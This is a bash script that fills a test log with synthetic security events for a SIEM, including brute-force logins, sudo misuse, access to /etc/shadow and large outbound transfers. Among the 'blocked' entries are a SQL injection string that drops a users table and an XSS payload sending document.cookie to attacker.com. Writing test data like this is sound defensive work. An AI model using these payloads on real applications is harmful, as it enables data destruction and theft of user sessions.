#!/bin/bash

> test_logs/test.log

NUM_LOGS=50
TIME_RANGE=12  # Hours in the past to distribute logs

echo "Generating $NUM_LOGS standard logs plus scenario-specific logs..."

USERNAMES=("admin" "root" "user" "guest" "john" "alice" "bob" "carol" "system" "jenkins")
IPS=("192.168.1.100" "192.168.1.101" "10.0.0.5" "172.16.0.12" "8.8.8.8" "1.1.1.1" "203.0.113.4")
PORTS=("22" "80" "443" "3306" "5432" "8080" "8443")
SERVICES=("ssh" "http" "mysql" "postgresql" "nginx" "apache" "docker")
PROCESSES=("sshd" "httpd" "mysqld" "postgres" "nginx" "apache2" "dockerd" "systemd")
PATHS=("/etc/passwd" "/etc/shadow" "/var/log/auth.log" "/etc/ssh/sshd_config" "/home/user/.ssh/id_rsa")
MALICIOUS_IPS=("185.143.223.12" "103.43.141.122" "91.240.118.168" "185.176.27.132" "77.247.110.65")

random_timestamp() {
    local hours_ago=$((RANDOM % TIME_RANGE))
    local minutes_ago=$((RANDOM % 60))
    local seconds_ago=$((RANDOM % 60))
    date -v-${hours_ago}H -v-${minutes_ago}M -v-${seconds_ago}S "+%Y-%m-%d %H:%M:%S"
}

random_element() {
    local array=("$@")
    echo "${array[$RANDOM % ${#array[@]}]}"
}

for ((i=1; i<=$NUM_LOGS; i++)); do
    log_type=$((RANDOM % 100))
    timestamp=$(random_timestamp)
    
    username=$(random_element "${USERNAMES[@]}")
    ip=$(random_element "${IPS[@]}")
    port=$(random_element "${PORTS[@]}")
    service=$(random_element "${SERVICES[@]}")
    process=$(random_element "${PROCESSES[@]}")
    path=$(random_element "${PATHS[@]}")
    
    if [ $log_type -lt 40 ]; then
        level="INFO"
        message="User $username logged in successfully from $ip"
    elif [ $log_type -lt 70 ]; then
        level="WARNING"
        message="Failed login attempt from $ip"
    elif [ $log_type -lt 90 ]; then
        level="ERROR"
        message="Service $service crashed unexpectedly"
    else
        level="CRITICAL"
        message="Security breach detected from $ip"
    fi
    
    echo "$timestamp $level $message" >> test_logs/test.log
done

echo "Adding scenario logs for testing new features..."

timestamp=$(random_timestamp)
echo "$timestamp WARNING User guest executed sudo su -" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING User jenkins executed sudo chmod 777 /etc/shadow" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp INFO User alice executed sudo apt-get update" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING User root accessed sensitive file /etc/shadow from 192.168.1.50" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING User guest accessed /etc/passwd at 03:45 AM" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING User carol modified /etc/sudoers file" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp CRITICAL Large outbound data transfer: 5.2GB to 45.77.65.211 detected" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING Unusual upload pattern detected: 700MB to external FTP" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp CRITICAL Database dump (3.1GB) transferred to unknown IP 91.240.118.168" >> test_logs/test.log

for ip in "${MALICIOUS_IPS[@]}"; do
    timestamp=$(random_timestamp)
    echo "$timestamp WARNING Connection attempt from $ip rejected" >> test_logs/test.log
done

timestamp=$(random_timestamp)
echo "$timestamp ERROR Multiple connection attempts from 185.176.27.132 to port 22" >> test_logs/test.log

attack_ip="10.0.0.99"
for ((i=1; i<=8; i++)); do
    timestamp=$(random_timestamp)
    echo "$timestamp WARNING Failed login attempt from $attack_ip" >> test_logs/test.log
done

timestamp=$(random_timestamp)
echo "$timestamp WARNING Blocked SQL injection attempt: ' OR 1=1; DROP TABLE users; --" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING Blocked XSS attempt: <script>document.location='http://attacker.com/cookie='+document.cookie</script>" >> test_logs/test.log

timestamp=$(random_timestamp)
echo "$timestamp WARNING Web application firewall blocked attack from 77.247.110.65" >> test_logs/test.log

suspect_ip="192.168.1.200"
for ((i=1; i<=5; i++)); do
    timestamp=$(random_timestamp)
    echo "$timestamp WARNING Failed login attempt for admin from $suspect_ip" >> test_logs/test.log
done
timestamp=$(random_timestamp)
echo "$timestamp INFO User admin logged in successfully from $suspect_ip" >> test_logs/test.log
timestamp=$(random_timestamp)
echo "$timestamp WARNING User admin executed passwd root" >> test_logs/test.log

echo "Log generation complete! Generated $(wc -l < test_logs/test.log) log entries."
echo "Run the SIEM to process these logs:"
echo "pipenv run python src/main.py"
